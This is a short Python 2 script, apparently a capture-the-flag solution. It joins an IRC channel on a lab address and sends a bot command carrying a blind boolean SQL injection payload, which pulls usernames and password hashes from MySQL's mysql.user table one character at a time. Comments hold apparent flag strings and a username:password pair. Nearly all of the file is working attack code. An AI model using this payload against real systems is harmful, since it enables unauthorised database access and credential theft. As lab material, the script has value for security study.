import sys
import socket
import string

HOST="10.1.1.4"
PORT=6667
NICK="sqli"
IDENT="sqli"
REALNAME="sqli"
readbuffer=""

s=socket.socket( )
s.connect(("10.1.1.4", 6667))
s.send("NICK sqli\r\n")
s.send("USER sqli sqli sqli :sqli\r\n")
s.send("JOIN #secret\r\n")

'''SQL_1nj3ct10n_v1a_IRC_Ch4T'''
'''The_5th_Fl@g_1s_C0mpr0m1s5_Th3_S3rv3r'''
'''satoshi:pikachu'''

res = ""

for i in range(1,50):
    done = False
    for j in range(0x20,0x7E):
        payload = '''!country x' or ascii(substring((select group_concat(user,0x3a,password) from mysql.user limit 0,1 ),%d,1))='%d'#'''%(i,j)
        s.send("PRIVMSG #secret :"+payload+"\r\n")

        readbuffer=readbuffer+s.recv(1024)
        temp=string.split(readbuffer, "\n")
        readbuffer=temp.pop( )

        for line in temp:
            line=string.rstrip(line)
            line=string.split(line)

            if len(line)>4 and line[4]=="Found":
                res += chr(j-1)
                done = True
                break

            if(line[0]=="PING"):
                s.send("PONG %s\r\n" % line[1])

        if done:
            break

print res
